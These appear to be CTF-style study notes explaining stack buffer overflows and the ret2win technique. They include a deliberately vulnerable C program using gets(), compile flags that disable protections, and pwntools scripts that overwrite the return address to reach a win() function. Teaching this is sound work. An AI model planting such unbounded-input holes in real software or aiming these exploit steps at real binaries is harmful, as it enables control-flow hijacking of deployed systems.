
# ğŸ“š Stack Overflow & ret2win& ret functions â€” Full Exploit Notes

---

## ğŸ§  What Is a Stack Overflow?

A **stack overflow** occurs when data written to a **stack buffer** exceeds its allocated size and **overwrites adjacent memory** â€” especially the **saved return address**.

This lets an attacker **redirect execution** to arbitrary code or functions.

---

## ğŸ§¨ What Is ret2win?

**ret2win** (short for "return to win") is a **beginner-level exploit** where the attacker:

- **Overflows** a buffer on the stack
    
- **Overwrites** the saved return address
    
- **Redirects execution** to a function like `win()` that prints a flag or spawns a shell
    

> No shellcode needed â€” just return to an existing function.

---

## ğŸ“ Sample Vulnerable C Program

c



`#include <stdio.h> #include <string.h> #include <stdlib.h>  void win() {     system("cat flag.txt");  // Attacker's goal }  void vuln() {     char buffer[64];         // Stack buffer     printf("Enter your input: ");     gets(buffer);            // âŒ Vulnerable: no bounds check }  int main() {     vuln();     return 0; }`

### ğŸ”¥ Vulnerabilities:

- Uses `gets()` â†’ allows **unbounded input**
    
- `win()` is never called by default
    
- Return address can be overwritten to jump to `win()`
    

---

## ğŸ” Stack Layout (After vuln is called)

kotlin



`[ buffer (64 bytes)         ] [ saved EBP (4 or 8 bytes)  ] [ return address (4 or 8)   ]  â—„â”€â”€â”€â”€ overwrite this!`

To hijack control flow:

ini



`payload = [ 'A' * 64 ] + [ 'B' * 8 ] + [ win() address ]`

---

## ğŸ§ª ret2win Exploitation â€“ Step-by-Step

### âœ… 1. Compile with No Protections (Linux)

bash



`gcc -fno-stack-protector -z execstack -no-pie -o vuln vuln.c`

### âœ… 2. Find Address of `win()`

bash



`objdump -d vuln | grep win`

Example:

php-template



`080491e2 <win>:`

(Use this address in the payload)

---

### âœ… 3. Build the Exploit Payload

- 64 bytes to fill buffer
    
- 4â€“8 bytes for saved EBP
    
- Address of `win()` (in little-endian)
    

python



`from pwn import *  win = p32(0x080491e2)        # Replace with actual win address payload = b"A"*64 + b"B"*4 + win  p = process("./vuln") p.sendline(payload) p.interactive()`

---

### ğŸ§  ret2win Summary Table

|Element|Description|
|---|---|
|Overflow Type|Stack-based buffer overflow|
|Target|Saved return address|
|Payload|Buffer filler + win() address|
|Protection Bypass|No need to disable NX|
|Complexity|Low â€“ no shellcode needed|

---

## ğŸ›¡ï¸ Protections That Can Break ret2win

|Protection|Blocks?|Bypass|
|---|---|---|
|**Stack Canary**|âœ…|Brute-force, info leak|
|**ASLR**|âŒ for static binaries|Leak libc|
|**PIE**|âœ…|Leak binary base|
|**DEP/NX**|âŒ|Not needed here|
|**RELRO (Full)**|âŒ|No GOT overwrite used|

---

## ğŸ“œ Common ret2win CTF Pattern

### âœ… Provided:

- `win()` function
    
- Input via `gets()` or `fgets()`
    
- No PIE or stack canary
    

### ğŸ”“ Goal:

- Find offset to return address
    
- Overwrite return address with `win()`'s address
    
- Get the flag!
    

---

## ğŸ§ª ret2win GDB Debugging Tips

bash



`gdb ./vuln b vuln run`

Then use:

- `info frame` â€“ view return address
    
- `x/20x $esp` â€“ inspect stack
    
- `pattern_create` / `pattern_offset` â€“ find overflow offset
    

---

## ğŸ“¦ Bonus: Python Payload Generator

python



`from pwn import *  offset = 64 + 4               # Buffer + saved EBP win = p32(0x080491e2)         # Replace with correct address  payload = b"A" * offset + win  with open("payload", "wb") as f:     f.write(payload)`

---

## ğŸ”š Summary

|Concept|Details|
|---|---|
|Stack Overflow|Writes beyond buffer, into return addr|
|ret2win|Redirects execution to a known function|
|Why it works|Return address is overwritten|
|What you need|Address of `win()`, overflow offset|
|Fix|Use `fgets`, enable stack protector, PIE, etc.|
